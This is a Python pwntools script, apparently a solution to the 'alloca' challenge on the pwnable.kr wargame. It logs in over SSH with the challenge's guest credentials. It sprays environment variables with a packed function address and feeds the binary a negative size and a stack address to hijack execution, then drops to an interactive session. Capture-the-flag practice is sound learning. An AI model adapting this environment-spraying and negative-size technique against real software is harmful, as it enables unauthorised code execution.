import struct
import pwn

HOST = 'pwnable.kr'
PORT = 2222
USER = 'alloca'
PASSWORD = 'guest'

BINARY = '/home/home/alloca'
CALLME_ADDR = 0x80485ab
# ENV_ADDR = 0xffc20000
# ENV_ADDR = -4063232

# ENV_ADDR = 0xffa00000
# ENV_ADDR = -6291456

# ENV_ADDR = 0xffb80000
ENV_ADDR = -4718592


def main():

	sh_addr = struct.pack("<I", CALLME_ADDR)

	size = "-82"

	env_address = str(ENV_ADDR)
	print (env_address)


	sprayed_env = {}

	# for i in range (0x20000): 
		#sprayed_env['ENV{}'.format(i)] = sh_addr

	# populate with less pollution characters 
	for i in range (15):
		sprayed_env[str(i)] = sh_addr * 30000

	s = pwn.ssh(host = HOST, port = PORT, user = USER, password = PASSWORD)

	p = s.process(BINARY, env = sprayed_env)
	
	
	p.sendline(size)
	p.sendline(env_address)
	

	p.interactive()
	
	
	return


if __name__ == '__main__':
	main()